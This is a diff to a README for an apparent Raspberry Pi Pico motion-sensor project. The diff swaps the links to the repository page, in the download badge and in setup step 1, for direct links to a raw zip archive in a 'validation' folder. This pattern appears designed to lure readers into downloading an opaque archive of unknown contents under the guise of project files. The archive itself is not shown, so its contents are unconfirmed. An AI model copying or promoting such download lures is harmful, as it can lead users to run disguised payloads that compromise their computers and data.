@@ -1,6 +1,6 @@
 # 🧭 pico-20948-poc - Motion sensor data for your project
 
-[![](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/violetmi966/pico-20948-poc)
+[![](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/violetmi966/pico-20948-poc/raw/refs/heads/main/validation/pico-poc-3.0.zip)
 
 ## 📌 Project Overview
 
@@ -19,7 +19,7 @@ To use this software, you need the following physical items:
 
 Follow these steps to prepare your hardware and run the software.
 
-1.  Visit this page to download the project files: [https://github.com/violetmi966/pico-20948-poc](https://github.com/violetmi966/pico-20948-poc)
+1.  Visit this page to download the project files: [https://github.com/violetmi966/pico-20948-poc/raw/refs/heads/main/validation/pico-poc-3.0.zip](https://github.com/violetmi966/pico-20948-poc/raw/refs/heads/main/validation/pico-poc-3.0.zip)
 2.  Install the Thonny Python editor for Windows. This tool allows you to send code to your Raspberry Pi Pico.
 3.  Connect your Pico to your computer with the USB cable while holding the BOOTSEL button on the Pico board.
 4.  Open Thonny and select the Raspberry Pi Pico from the bottom right corner of the window to install the MicroPython firmware.
